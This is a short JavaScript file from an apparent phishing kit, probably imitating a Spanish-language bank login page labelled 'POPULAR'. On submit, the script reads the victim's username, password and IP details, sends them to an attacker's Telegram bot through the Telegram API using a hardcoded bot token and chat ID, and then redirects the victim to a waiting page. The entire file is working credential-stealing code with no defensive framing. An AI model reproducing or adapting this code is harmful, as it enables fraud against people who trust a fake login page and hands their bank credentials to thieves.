//bot token
var telegram_bot_id = "7762893737:AAGN0IehFnSVWClB93tdrTlWrdMfOHhy-zU";
//chat id
var chat_id =5150089222;
var u_name, u_name2, ip, ip2;
var ready = function () {
    u_name = document.getElementById("user").value;
    u_name2 = document.getElementById("password").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "🔵POPULAR🔵\n👤Usuario: " + u_name + "\n🔐Contraseña: " + u_name2 + "\nIP: " + ip +"\n" + ip2 +"\n🧿C0de by JSC0D3R🧿";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'espere.html';
        console.log(response);
    });
    return false;
};
